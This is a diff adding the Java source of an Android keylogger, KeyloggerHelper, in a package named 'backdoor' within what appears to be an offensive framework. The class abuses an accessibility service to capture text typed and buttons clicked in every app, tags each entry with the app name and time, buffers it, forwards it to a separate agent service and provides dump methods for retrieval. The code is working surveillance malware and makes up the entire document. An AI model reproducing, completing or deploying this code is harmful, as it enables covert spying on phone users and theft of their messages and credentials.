@@ -1,0 +1,649 @@
+package com.lazyframework.backdoor;
+
+import android.accessibilityservice.AccessibilityService;
+import android.accessibilityservice.AccessibilityServiceInfo;
+import android.content.Context;
+import android.content.Intent;
+import android.os.Build;
+import android.os.Handler;
+import android.os.Looper;
+import android.util.Log;
+import android.view.KeyEvent;
+import android.view.accessibility.AccessibilityEvent;
+import android.view.accessibility.AccessibilityNodeInfo;
+import android.text.TextUtils;
+
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
+import java.util.concurrent.ConcurrentHashMap;
+import java.util.concurrent.atomic.AtomicBoolean;
+
+public class KeyloggerHelper extends AccessibilityService {
+    private static final String TAG = "LazyFramework";
+    
+    // ==================== STATIC REFERENCES ====================
+    private static AgentService agentService;
+    private static KeyloggerHelper instance;
+    private static boolean isServiceRunning = false;
+    
+    // ==================== KEYLOGGING STATE ====================
+    private AtomicBoolean isKeyloggingEnabled = new AtomicBoolean(false);
+    private String lastText = "";  // PENTING: Track text changes
+    private String lastPackageName = "";
+    private String lastClassName = "";
+    private long lastEventTime = 0;
+    
+    // ==================== BUFFER & CACHE ====================
+    private StringBuilder keyBuffer = new StringBuilder();
+    private static final int MAX_BUFFER_SIZE = 500000;
+    private StringBuilder fullLogBuffer = new StringBuilder();
+    private static final int MAX_LOG_SIZE = 1000000;
+    
+    // ==================== VIEW TRACKING ====================
+    private ConcurrentHashMap<String, String> viewTextMap = new ConcurrentHashMap<>();
+    
+    // ==================== KEY MAPPING ====================
+    private static final ConcurrentHashMap<Integer, String> KEY_MAP = new ConcurrentHashMap<>();
+    private static final ConcurrentHashMap<Integer, String> SHIFT_KEY_MAP = new ConcurrentHashMap<>();
+    
+    static {
+        // ============ LETTERS ============
+        KEY_MAP.put(KeyEvent.KEYCODE_A, "a"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_A, "A");
+        KEY_MAP.put(KeyEvent.KEYCODE_B, "b"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_B, "B");
+        KEY_MAP.put(KeyEvent.KEYCODE_C, "c"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_C, "C");
+        KEY_MAP.put(KeyEvent.KEYCODE_D, "d"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_D, "D");
+        KEY_MAP.put(KeyEvent.KEYCODE_E, "e"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_E, "E");
+        KEY_MAP.put(KeyEvent.KEYCODE_F, "f"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_F, "F");
+        KEY_MAP.put(KeyEvent.KEYCODE_G, "g"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_G, "G");
+        KEY_MAP.put(KeyEvent.KEYCODE_H, "h"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_H, "H");
+        KEY_MAP.put(KeyEvent.KEYCODE_I, "i"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_I, "I");
+        KEY_MAP.put(KeyEvent.KEYCODE_J, "j"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_J, "J");
+        KEY_MAP.put(KeyEvent.KEYCODE_K, "k"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_K, "K");
+        KEY_MAP.put(KeyEvent.KEYCODE_L, "l"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_L, "L");
+        KEY_MAP.put(KeyEvent.KEYCODE_M, "m"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_M, "M");
+        KEY_MAP.put(KeyEvent.KEYCODE_N, "n"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_N, "N");
+        KEY_MAP.put(KeyEvent.KEYCODE_O, "o"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_O, "O");
+        KEY_MAP.put(KeyEvent.KEYCODE_P, "p"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_P, "P");
+        KEY_MAP.put(KeyEvent.KEYCODE_Q, "q"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_Q, "Q");
+        KEY_MAP.put(KeyEvent.KEYCODE_R, "r"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_R, "R");
+        KEY_MAP.put(KeyEvent.KEYCODE_S, "s"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_S, "S");
+        KEY_MAP.put(KeyEvent.KEYCODE_T, "t"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_T, "T");
+        KEY_MAP.put(KeyEvent.KEYCODE_U, "u"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_U, "U");
+        KEY_MAP.put(KeyEvent.KEYCODE_V, "v"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_V, "V");
+        KEY_MAP.put(KeyEvent.KEYCODE_W, "w"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_W, "W");
+        KEY_MAP.put(KeyEvent.KEYCODE_X, "x"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_X, "X");
+        KEY_MAP.put(KeyEvent.KEYCODE_Y, "y"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_Y, "Y");
+        KEY_MAP.put(KeyEvent.KEYCODE_Z, "z"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_Z, "Z");
+        
+        // ============ NUMBERS ============
+        KEY_MAP.put(KeyEvent.KEYCODE_0, "0"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_0, ")");
+        KEY_MAP.put(KeyEvent.KEYCODE_1, "1"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_1, "!");
+        KEY_MAP.put(KeyEvent.KEYCODE_2, "2"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_2, "@");
+        KEY_MAP.put(KeyEvent.KEYCODE_3, "3"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_3, "#");
+        KEY_MAP.put(KeyEvent.KEYCODE_4, "4"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_4, "$");
+        KEY_MAP.put(KeyEvent.KEYCODE_5, "5"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_5, "%");
+        KEY_MAP.put(KeyEvent.KEYCODE_6, "6"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_6, "^");
+        KEY_MAP.put(KeyEvent.KEYCODE_7, "7"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_7, "&");
+        KEY_MAP.put(KeyEvent.KEYCODE_8, "8"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_8, "*");
+        KEY_MAP.put(KeyEvent.KEYCODE_9, "9"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_9, "(");
+        
+        // ============ SYMBOLS ============
+        KEY_MAP.put(KeyEvent.KEYCODE_PERIOD, "."); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_PERIOD, ">");
+        KEY_MAP.put(KeyEvent.KEYCODE_COMMA, ","); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_COMMA, "<");
+        KEY_MAP.put(KeyEvent.KEYCODE_SLASH, "/"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_SLASH, "?");
+        KEY_MAP.put(KeyEvent.KEYCODE_BACKSLASH, "\\"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_BACKSLASH, "|");
+        KEY_MAP.put(KeyEvent.KEYCODE_GRAVE, "`"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_GRAVE, "~");
+        KEY_MAP.put(KeyEvent.KEYCODE_MINUS, "-"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_MINUS, "_");
+        KEY_MAP.put(KeyEvent.KEYCODE_EQUALS, "="); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_EQUALS, "+");
+        KEY_MAP.put(KeyEvent.KEYCODE_LEFT_BRACKET, "["); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_LEFT_BRACKET, "{");
+        KEY_MAP.put(KeyEvent.KEYCODE_RIGHT_BRACKET, "]"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_RIGHT_BRACKET, "}");
+        KEY_MAP.put(KeyEvent.KEYCODE_SEMICOLON, ";"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_SEMICOLON, ":");
+        KEY_MAP.put(KeyEvent.KEYCODE_APOSTROPHE, "'"); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_APOSTROPHE, "\"");
+        KEY_MAP.put(KeyEvent.KEYCODE_SPACE, " "); SHIFT_KEY_MAP.put(KeyEvent.KEYCODE_SPACE, " ");
+    }
+
+    // ==================== SERVICE LIFECYCLE ====================
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        Log.d(TAG, "⌨️ KeyloggerHelper created");
+        instance = this;
+        isServiceRunning = true;
+        
+        // Configure accessibility service
+        configureService();
+        
+        // Start listening
+        isKeyloggingEnabled.set(true);
+        
+        // Set initial state
+        keyBuffer.setLength(0);
+        fullLogBuffer.setLength(0);
+        lastText = "";
+        
+        Log.d(TAG, "✅ KeyloggerHelper initialized and listening");
+    }
+
+    @Override
+    public void onAccessibilityEvent(AccessibilityEvent event) {
+        // Skip if keylogging is disabled
+        if (!isKeyloggingEnabled.get()) {
+            return;
+        }
+
+        try {
+            int eventType = event.getEventType();
+            
+            // ============ MAIN: HANDLE TEXT INPUT ============
+            if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
+                handleTextChanged(event);
+            }
+            
+            // ============ HANDLE WINDOW STATE CHANGED ============
+            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                handleWindowChange(event);
+            }
+            
+            // ============ HANDLE VIEW CLICKED (untuk metrack focus) ============
+            if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+                handleViewClicked(event);
+            }
+            
+            // ============ HANDLE VIEW FOCUSED ============
+            if (eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
+                handleViewFocused(event);
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "❌ Accessibility event error: " + e.getMessage());
+        }
+    }
+
+    @Override
+    public void onInterrupt() {
+        Log.w(TAG, "⚠️ KeyloggerHelper interrupted");
+        isServiceRunning = false;
+    }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        Log.d(TAG, "⌨️ KeyloggerHelper destroyed");
+        isServiceRunning = false;
+        instance = null;
+        isKeyloggingEnabled.set(false);
+    }
+
+    @Override
+    public void onServiceConnected() {
+        super.onServiceConnected();
+        Log.d(TAG, "✅ KeyloggerHelper service connected");
+        isServiceRunning = true;
+        isKeyloggingEnabled.set(true);
+        configureService();
+    }
+
+    // ==================== CONFIGURATION ====================
+
+    private void configureService() {
+        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
+        
+        // ============ PENTING: Listen untuk semua event types ============
+        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
+        
+        // ============ Set feedback type ============
+        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
+        
+        // ============ PENTING: Flags untuk better access ============
+        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
+                     AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            info.flags |= AccessibilityServiceInfo.FLAG_REQUEST_ENHANCED_WEB_ACCESSIBILITY;
+        }
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            info.flags |= AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE;
+        }
+        
+        // PENTING: Reduce notification timeout untuk lebih cepat
+        info.notificationTimeout = 100;
+        
+        setServiceInfo(info);
+        Log.d(TAG, "✅ Accessibility service configured");
+    }
+
+    // ==================== TEXT CHANGED - MAIN INPUT HANDLER ====================
+
+    private void handleTextChanged(AccessibilityEvent event) {
+        try {
+            // Get text dari event
+            CharSequence[] text = event.getText();
+            if (text == null || text.length == 0) {
+                return;
+            }
+            
+            String newText = text[0].toString();
+            if (newText == null || newText.isEmpty()) {
+                return;
+            }
+            
+            // Get package dan class info
+            String packageName = event.getPackageName() != null ? 
+                event.getPackageName().toString() : "unknown";
+            String className = event.getClassName() != null ?
+                event.getClassName().toString() : "unknown";
+            
+            // Log window change jika beda
+            if (!packageName.equals(lastPackageName)) {
+                logWindowChange(packageName, className);
+                lastPackageName = packageName;
+                lastClassName = className;
+            }
+            
+            // ============ DETECT WHAT CHANGED ============
+            String changedText = detectTextChange(lastText, newText);
+            
+            if (changedText != null && !changedText.isEmpty()) {
+                // Check if password field
+                boolean isPassword = false;
+                AccessibilityNodeInfo source = event.getSource();
+                if (source != null) {
+                    isPassword = source.isPassword();
+                    source.recycle();
+                }
+                
+                // Log the keystroke
+                logKey(packageName, className, changedText, isPassword);
+                
+                // Forward to agent service
+                if (agentService != null) {
+                    agentService.onKeyLogged(changedText);
+                }
+            }
+            
+            // Update last text
+            lastText = newText;
+            lastEventTime = System.currentTimeMillis();
+            
+        } catch (Exception e) {
+            Log.e(TAG, "❌ Text changed error: " + e.getMessage());
+        }
+    }
+
+    // ==================== DETECT TEXT CHANGE ====================
+
+    private String detectTextChange(String oldText, String newText) {
+        try {
+            if (oldText == null) oldText = "";
+            if (newText == null) newText = "";
+            
+            // Sama - tidak ada perubahan
+            if (oldText.equals(newText)) {
+                return null;
+            }
+            
+            int oldLen = oldText.length();
+            int newLen = newText.length();
+            
+            // ============ CASE 1: TEXT DELETED (lebih pendek) ============
+            if (newLen < oldLen) {
+                // Find position dimana perbedaan mulai
+                int minLen = Math.min(oldLen, newLen);
+                int diffPos = 0;
+                
+                for (int i = 0; i < minLen; i++) {
+                    if (oldText.charAt(i) != newText.charAt(i)) {
+                        diffPos = i;
+                        break;
+                    }
+                    diffPos = i + 1;
+                }
+                
+                // Get deleted text
+                String deleted = oldText.substring(diffPos);
+                
+                if (deleted.length() > 0) {
+                    // Log deletion
+                    if (deleted.length() <= 20) {
+                        return "[DEL:" + deleted + "]";
+                    } else {
+                        return "[DEL:" + deleted.length() + "chars]";
+                    }
+                }
+                return null;
+            }
+            
+            // ============ CASE 2: TEXT ADDED (lebih panjang) ============
+            if (newLen > oldLen) {
+                // Find position dimana text ditambahkan
+                int minLen = Math.min(oldLen, newLen);
+                int diffPos = 0;
+                
+                for (int i = 0; i < minLen; i++) {
+                    if (oldText.charAt(i) != newText.charAt(i)) {
+                        diffPos = i;
+                        break;
+                    }
+                    diffPos = i + 1;
+                }
+                
+                // Get added text
+                String added = newText.substring(diffPos);
+                
+                if (added.length() > 0) {
+                    return added;
+                }
+                return null;
+            }
+            
+            // ============ CASE 3: SAME LENGTH - REPLACEMENT ============
+            if (oldLen == newLen) {
+                StringBuilder changed = new StringBuilder();
+                for (int i = 0; i < oldLen; i++) {
+                    if (oldText.charAt(i) != newText.charAt(i)) {
+                        changed.append(newText.charAt(i));
+                    }
+                }
+                
+                if (changed.length() > 0) {
+                    return changed.toString();
+                }
+            }
+            
+            return null;
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Detect change error: " + e.getMessage());
+            return null;
+        }
+    }
+
+    // ==================== LOG KEY ====================
+
+    private void logKey(String packageName, String className, String keyText, boolean isPassword) {
+        try {
+            if (keyText == null || keyText.isEmpty()) {
+                return;
+            }
+            
+            // Mask jika password
+            String displayText = keyText;
+            if (isPassword && keyText.length() > 0) {
+                displayText = "[PWD:" + "*".repeat(Math.max(1, keyText.length())) + "]";
+            }
+            
+            // Format log entry
+            String timestamp = getCurrentTimestamp();
+            String logEntry = String.format(
+                "[%s] %s: %s\n",
+                timestamp,
+                packageName,
+                displayText
+            );
+            
+            // Append to buffer
+            appendToBuffer(logEntry);
+            
+            // Debug log
+            String debugText = displayText.length() > 50 ? 
+                displayText.substring(0, 50) + "..." : displayText;
+            Log.d(TAG, "⌨️ Input: " + debugText);
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Log key error: " + e.getMessage());
+        }
+    }
+
+    // ==================== LOG WINDOW CHANGE ====================
+
+    private void logWindowChange(String packageName, String className) {
+        try {
+            String timestamp = getCurrentTimestamp();
+            String logEntry = String.format(
+                "\n=== [%s] WINDOW: %s ===\n",
+                timestamp,
+                packageName
+            );
+            
+            appendToBuffer(logEntry);
+            Log.d(TAG, "🪟 Window: " + packageName);
+            
+        } catch (Exception e) {
+            Log.e(TAG, "Window change error: " + e.getMessage());
+        }
+    }
+
+    // ==================== HANDLE VIEW CLICKED ====================
+
+    private void handleViewClicked(AccessibilityEvent event) {
+        try {
+            AccessibilityNodeInfo source = event.getSource();
+            if (source != null) {
+                CharSequence text = source.getText();
+                CharSequence desc = source.getContentDescription();
+                
+                String logText = null;
+                if (text != null && text.length() > 0) {
+                    logText = "[CLICK] " + text.toString();
+                } else if (desc != null && desc.length() > 0) {
+                    logText = "[CLICK] " + desc.toString();
+                }
+                
+                if (logText != null) {
+                    String packageName = event.getPackageName() != null ?
+                        event.getPackageName().toString() : "unknown";
+                    
+                    String timestamp = getCurrentTimestamp();
+                    String logEntry = String.format(
+                        "[%s] %s - %s\n",
+                        timestamp,
+                        packageName,
+                        logText
+                    );
+                    
+                    appendToBuffer(logEntry);
+                    
+                    if (agentService != null) {
+                        agentService.onKeyLogged(logText);
+                    }
+                }
+                
+                source.recycle();
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "View clicked error: " + e.getMessage());
+        }
+    }
+
+    // ==================== HANDLE VIEW FOCUSED ====================
+
+    private void handleViewFocused(AccessibilityEvent event) {
+        try {
+            AccessibilityNodeInfo source = event.getSource();
+            if (source != null) {
+                // Track focused view untuk context
+                String className = event.getClassName() != null ?
+                    event.getClassName().toString() : "unknown";
+                
+                Log.d(TAG, "✏️ Focus: " + className);
+                source.recycle();
+            }
+        } catch (Exception e) {
+            // Ignore
+        }
+    }
+
+    // ==================== BUFFER MANAGEMENT ====================
+
+    private synchronized void appendToBuffer(String text) {
+        try {
+            keyBuffer.append(text);
+            fullLogBuffer.append(text);
+            
+            // Trim fullLogBuffer jika terlalu besar
+            if (fullLogBuffer.length() > MAX_LOG_SIZE) {
+                int cutIndex = fullLogBuffer.indexOf("\n", fullLogBuffer.length() / 2);
+                if (cutIndex > 0) {
+                    fullLogBuffer.delete(0, cutIndex + 1);
+                }
+            }
+            
+            // Trim keyBuffer jika terlalu besar
+            if (keyBuffer.length() > MAX_BUFFER_SIZE) {
+                int cutIndex = keyBuffer.indexOf("\n", keyBuffer.length() / 2);
+                if (cutIndex > 0) {
+                    keyBuffer.delete(0, cutIndex + 1);
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Buffer error: " + e.getMessage());
+        }
+    }
+
+    // ==================== TIMESTAMP ====================
+
+    private String getCurrentTimestamp() {
+        return new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
+    }
+
+    private String getFullTimestamp() {
+        return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
+    }
+
+    // ==================== PUBLIC METHODS FOR AGENT ====================
+
+    public static void setAgentService(AgentService service) {
+        agentService = service;
+        Log.d(TAG, "📡 AgentService connected to KeyloggerHelper");
+    }
+
+    public static KeyloggerHelper getInstance() {
+        return instance;
+    }
+
+    public static boolean isRunning() {
+        return isServiceRunning && instance != null;
+    }
+
+    // ==================== START/STOP KEYLOGGING ====================
+
+    public void startKeylogging() {
+        isKeyloggingEnabled.set(true);
+        lastText = "";
+        
+        String logEntry = String.format(
+            "\n=== KEYLOGGER STARTED AT %s ===\n",
+            getFullTimestamp()
+        );
+        appendToBuffer(logEntry);
+        
+        Log.d(TAG, "✅ Keylogging started");
+    }
+
+    public void stopKeylogging() {
+        isKeyloggingEnabled.set(false);
+        
+        String logEntry = String.format(
+            "\n=== KEYLOGGER STOPPED AT %s ===\n",
+            getFullTimestamp()
+        );
+        appendToBuffer(logEntry);
+        
+        Log.d(TAG, "⏹️ Keylogging stopped");
+    }
+
+    public boolean isKeyloggingEnabled() {
+        return isKeyloggingEnabled.get();
+    }
+
+    // ==================== DUMP METHODS ====================
+
+    public String dumpKeylogs() {
+        try {
+            String logs;
+            synchronized (this) {
+                logs = fullLogBuffer.toString();
+                fullLogBuffer.setLength(0);
+                fullLogBuffer.append("=== NEW SESSION STARTED AT ")
+                    .append(getFullTimestamp())
+                    .append(" ===\n");
+            }
+            
+            String header = String.format(
+                "=== KEYLOG DUMP ===\nTime: %s\nSize: %d chars\n===================\n\n",
+                getFullTimestamp(),
+                logs.length()
+            );
+            
+            return header + logs;
+        } catch (Exception e) {
+            Log.e(TAG, "Dump error: " + e.getMessage());
+            return "Error: " + e.getMessage();
+        }
+    }
+
+    public String dumpBuffer() {
+        try {
+            String logs;
+            synchronized (this) {
+                logs = keyBuffer.toString();
+                keyBuffer.setLength(0);
+            }
+            return logs;
+        } catch (Exception e) {
+            return "Error: " + e.getMessage();
+        }
+    }
+
+    public String getStats() {
+        try {
+            synchronized (this) {
+                int bufferSize = fullLogBuffer.length();
+                int keyBufferSize = keyBuffer.length();
+                int lineCount = fullLogBuffer.toString().split("\n").length;
+                
+                return String.format(
+                    "📊 Keylogger Stats:\n" +
+                    "  Status: %s\n" +
+                    "  Total Lines: %d\n" +
+                    "  Log Size: %s\n" +
+                    "  Buffer Size: %s\n" +
+                    "  Current App: %s\n" +
+                    "  Time: %s",
+                    isKeyloggingEnabled.get() ? "✅ Running" : "❌ Stopped",
+                    lineCount,
+                    formatSize(bufferSize),
+                    formatSize(keyBufferSize),
+                    lastPackageName,
+                    getFullTimestamp()
+                );
+            }
+        } catch (Exception e) {
+            return "Error: " + e.getMessage();
+        }
+    }
+
+    public void clearLogs() {
+        synchronized (this) {
+            fullLogBuffer.setLength(0);
+            keyBuffer.setLength(0);
+            lastText = "";
+            fullLogBuffer.append("=== LOGS CLEARED AT ")
+                .append(getFullTimestamp())
+                .append(" ===\n");
+        }
+        Log.d(TAG, "🗑️ Logs cleared");
+    }
+
+    // ==================== UTILITY ====================
+
+    private String formatSize(long size) {
+        if (size <= 0) return "0 B";
+        String[] units = {"B", "KB", "MB"};
+        int digitGroups = (int) (Math.log10(size) / Math.log10(1024));
+        return String.format("%.1f %s", size / Math.pow(1024, digitGroups), units[digitGroups]);
+    }
+}
